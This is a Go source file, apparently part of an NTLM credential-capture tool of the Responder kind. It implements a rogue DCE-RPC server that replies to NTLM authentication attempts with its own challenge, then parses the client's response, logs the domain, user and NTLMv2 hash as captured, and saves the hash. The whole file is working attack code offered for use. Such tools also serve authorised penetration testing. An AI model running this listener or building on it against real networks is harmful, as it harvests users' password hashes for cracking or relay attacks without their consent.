package main

import (
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"time"
)

const (
	rpcPTYPE_BIND     = 0x0b
	rpcPTYPE_BIND_ACK = 0x0c
	rpcPTYPE_AUTH3    = 0x10
	rpcPTYPE_REQUEST  = 0x00
	rpcPTYPE_FAULT    = 0x03
	rpcAuthNTLM       = 0x0a
)

func serveDCERPC(ifaceIP net.IP, port int) {
	addr := fmt.Sprintf("%s:%d", ifaceIP, port)
	ln, err := net.Listen("tcp4", addr)
	if err != nil {
		logError("DCE-RPC listen %s — %v", addr, err)
		return
	}
	logInfo("DCE-RPC listening on %s:%d", ifaceIP, port)
	for {
		c, err := ln.Accept()
		if err != nil {
			continue
		}
		go handleDCERPC(c)
	}
}

func handleDCERPC(c net.Conn) {
	defer c.Close()
	c.SetDeadline(time.Now().Add(30 * time.Second))

	challenge := getChallenge()
	var authContextID uint32

	for {
		// DCE-RPC header is 16 bytes
		hdr := make([]byte, 16)
		if _, err := io.ReadFull(c, hdr); err != nil {
			return
		}
		fragLen := binary.LittleEndian.Uint16(hdr[8:10])
		authLen := binary.LittleEndian.Uint16(hdr[10:12])
		callID := binary.LittleEndian.Uint32(hdr[12:16])
		ptype := hdr[2]

		bodyLen := int(fragLen) - 16
		if bodyLen < 0 || bodyLen > 1<<20 {
			return
		}
		body := make([]byte, bodyLen)
		if _, err := io.ReadFull(c, body); err != nil {
			return
		}

		if int(authLen) > len(body) {
			return
		}

		switch ptype {
		case rpcPTYPE_BIND:
			// Auth verifier is at the end: 8-byte header + auth_value
			if authLen == 0 {
				// No auth — send simple BIND_ACK
				c.Write(buildDCERPCBindAck(callID, nil))
				continue
			}
			authVerifOff := len(body) - int(authLen) - 8
			if authVerifOff < 0 {
				return
			}
			av := body[authVerifOff:]
			if len(av) < 8 {
				return
			}
			authType := av[0]
			authContextID = binary.LittleEndian.Uint32(av[4:8])
			authValue := av[8:]

			if authType != rpcAuthNTLM {
				return
			}
			ntlm := FindNTLMSSP(authValue)
			if len(ntlm) < 12 {
				return
			}
			if binary.LittleEndian.Uint32(ntlm[8:12]) != 1 {
				return
			}
			logVerbose("DCE-RPC NTLM Type1 from %s", c.RemoteAddr())
			ntlmChallenge := BuildNTLMChallenge(challenge, sessionDomain, sessionMachineName)
			c.Write(buildDCERPCBindAck(callID, buildDCERPCAuthVerif(authType, authContextID, ntlmChallenge)))

		case rpcPTYPE_AUTH3:
			// Body: 4 bytes pad + auth verifier
			if len(body) < 12 || authLen == 0 {
				return
			}
			authVerifOff := len(body) - int(authLen) - 8
			if authVerifOff < 0 {
				return
			}
			av := body[authVerifOff:]
			if len(av) < 8 {
				return
			}
			authValue := av[8:]
			ntlm := FindNTLMSSP(authValue)
			if len(ntlm) < 12 {
				return
			}
			if binary.LittleEndian.Uint32(ntlm[8:12]) != 3 {
				return
			}
			hash, user, domain, err := ParseNTLMAuthenticate(ntlm, challenge)
			if err != nil {
				logVerbose("DCE-RPC NTLM parse: %v", err)
				return
			}
			logSuccess("[DCE-RPC] NTLMv2 captured from %s", c.RemoteAddr())
			logSuccess("          %s\\%s", domain, user)
			logSuccess("          %s", hash)
			saveHash(hash)
			return

		case rpcPTYPE_REQUEST:
			c.Write(buildDCERPCFault(callID))
			return
		}
	}
}

func buildDCERPCHeader(ptype byte, fragLen, authLen uint16, callID uint32) []byte {
	h := make([]byte, 16)
	h[0] = 0x05 // rpc_ver
	h[1] = 0x00 // rpc_ver_minor
	h[2] = ptype
	h[3] = 0x03 // pfc_flags: FirstFrag | LastFrag
	h[4] = 0x10 // packed_drep: little-endian
	binary.LittleEndian.PutUint16(h[8:10], fragLen)
	binary.LittleEndian.PutUint16(h[10:12], authLen)
	binary.LittleEndian.PutUint32(h[12:16], callID)
	return h
}

func buildDCERPCAuthVerif(authType byte, contextID uint32, authValue []byte) []byte {
	av := make([]byte, 8+len(authValue))
	av[0] = authType
	av[1] = 0x02 // auth_level: Connect
	av[2] = 0x00 // auth_pad_length
	av[3] = 0x00 // auth_rsrvd
	binary.LittleEndian.PutUint32(av[4:8], contextID)
	copy(av[8:], authValue)
	return av
}

func buildDCERPCBindAck(callID uint32, authVerif []byte) []byte {
	// sec_addr: port_any_t — uint16 length + string "135\x00"
	portStr := []byte{'1', '3', '5', 0x00}
	var body []byte
	body = append(body, 0xb8, 0x10) // max_xmit_frag 4280
	body = append(body, 0xb8, 0x10) // max_recv_frag 4280
	body = append(body, 0x00, 0x00, 0x00, 0x00) // assoc_group_id

	// sec_addr
	secAddr := make([]byte, 2+len(portStr))
	binary.LittleEndian.PutUint16(secAddr, uint16(len(portStr)))
	copy(secAddr[2:], portStr)
	body = append(body, secAddr...)

	// align to 4 bytes
	for len(body)%4 != 0 {
		body = append(body, 0x00)
	}

	// p_result_list: 1 result, accept (0x0000), transfer_syntax NDRRPC
	body = append(body,
		0x01, 0x00, // num_results
		0x00, 0x00, // alignment
		0x00, 0x00, // result: accept
		0x00, 0x00, // reason: not-specified
		// transfer syntax UUID (NDR)
		0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11,
		0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60,
		0x02, 0x00, 0x00, 0x00, // version 2
	)

	authLen := uint16(0)
	if authVerif != nil {
		authLen = uint16(len(authVerif))
	}
	fragLen := uint16(16 + len(body) + len(authVerif))
	hdr := buildDCERPCHeader(rpcPTYPE_BIND_ACK, fragLen, authLen, callID)

	out := append(hdr, body...)
	if authVerif != nil {
		out = append(out, authVerif...)
	}
	return out
}

func buildDCERPCFault(callID uint32) []byte {
	body := make([]byte, 8)
	binary.LittleEndian.PutUint32(body[4:], 0x1c010002) // nca_s_fault_access_denied
	hdr := buildDCERPCHeader(rpcPTYPE_FAULT, uint16(16+len(body)), 0, callID)
	return append(hdr, body...)
}
